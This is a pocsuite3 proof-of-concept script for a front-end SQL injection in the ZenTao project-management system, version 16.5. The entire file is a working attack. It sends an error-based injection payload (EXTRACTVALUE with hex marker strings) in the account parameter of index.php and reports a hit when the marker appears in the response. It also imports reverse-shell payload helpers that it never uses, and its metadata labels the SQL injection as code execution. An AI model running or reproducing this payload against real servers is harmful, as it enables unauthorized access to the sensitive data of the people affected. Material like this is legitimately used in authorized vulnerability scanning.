from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,time,base64,re

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '禅道16.5等最新版本存在前台SQL注入漏洞'
    appName = '禅道系统'
    appVersion = '16.5'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''禅道16.5等最新版本存在前台SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息等。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):              #验证模式
        result = {}
        path = "/index.php?account=admin'+AND+EXTRACTVALUE(6363,CONCAT(0x5c,0x71706a6a6b71,(SELECT+(ELT(6363%3d6363,1))),0x716a707a71))+AND'gEIB'%3d'gEIB"
        vulurl = self.url+path
        resp = requests.get(vulurl, verify = False, allow_redirects = False, timeout = 10)
        if  '\\qpjjkq1qjpzq' in resp.text and resp.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
